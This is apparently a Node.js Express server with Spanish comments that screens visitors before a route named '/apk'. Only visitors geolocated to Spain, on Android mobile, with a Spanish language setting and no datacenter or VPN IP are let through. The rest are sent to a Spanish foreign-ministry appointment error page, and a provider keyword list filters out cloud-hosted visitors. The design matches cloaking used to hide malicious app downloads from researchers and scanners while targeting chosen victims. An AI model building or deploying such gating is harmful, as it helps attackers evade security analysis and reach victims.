const express = require("express");
const axios = require("axios");
const useragent = require("useragent");
const path = require("path");

const app = express();

// servir frontend
app.use(express.static(path.join(__dirname, "public")));

// 🔎 obtener IP real
function getIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return forwarded.split(",")[0].trim();

  return req.headers["x-real-ip"] || req.socket.remoteAddress || "";
}

// 🌍 geolocalización
async function getGeo(ip) {
  try {
    const res = await axios.get(`https://ipapi.co/${ip}/json/`, {
      timeout: 2000
    });
    return res.data;
  } catch {
    return {};
  }
}

// 🤖 detección heurística VPN/proxy
function isSuspicious(geo) {
  if (!geo || !geo.org) return true;

  const org = geo.org.toLowerCase();

  if (geo.proxy === true) return true;
  if (geo.hosting === true) return true;

  const suspiciousKeywords = [
    "amazon", "google", "digitalocean", "ovh", "azure", "microsoft",
    "linode", "vultr", "hetzner", "cloudflare", "fastly", "akamai",
    "vpn", "proxy", "hosting", "server", "datacenter"
  ];

  return suspiciousKeywords.some(kw => org.includes(kw));
}

// 🧠 función de evaluación reutilizable
function evaluateAccess(req, geo) {
  const ua = req.headers["user-agent"] || "";
  const language = req.headers["accept-language"] || "";

  // 🔥 detección mejorada
  const isAndroid = /android/i.test(ua);
  const isMobile = /mobile/i.test(ua);
  const isRealAndroid = isAndroid && isMobile;

  const isSpain = geo.country === "ES";
  const isSpanishLang = language.toLowerCase().includes("es");
  const vpn = isSuspicious(geo);

  let score = 0;

  if (isSpain) score += 3;
  if (isRealAndroid) score += 3;
  if (isSpanishLang) score += 1;

  if (!isRealAndroid) score -= 5;
  if (vpn) score -= 6;
  else score += 2;

  if (!geo.country) score -= 2;

  const allow = score >= 6;

  return {
    allow,
    score,
    debug: {
      ua,
      ipCountry: geo.country,
      org: geo.org,
      vpn,
      isRealAndroid,
      isSpanishLang
    }
  };
}

// 🧠 endpoint check
app.get("/check", async (req, res) => {
  const ip = getIP(req);
  const geo = await getGeo(ip);

  const result = evaluateAccess(req, geo);

  console.log("---- VISITA ----");
  console.log({
    ip,
    ...result
  });

  res.json(result);
});

// 🔒 ruta protegida REAL
app.get("/apk", async (req, res) => {
  const ip = getIP(req);
  const geo = await getGeo(ip);

  const result = evaluateAccess(req, geo);

  if (!result.allow) {
    return res.redirect("/home");
  }

  return res.redirect("https://es.wikipedia.org/wiki/Bien_(filosof%C3%ADa)");
});

// fallback
app.get("/home", (req, res) => {
  res.redirect("https://www.exteriores.gob.es/es/Paginas/Error-Cita.aspx");
});

// root
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// puerto render
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Servidor activo en puerto", PORT);
});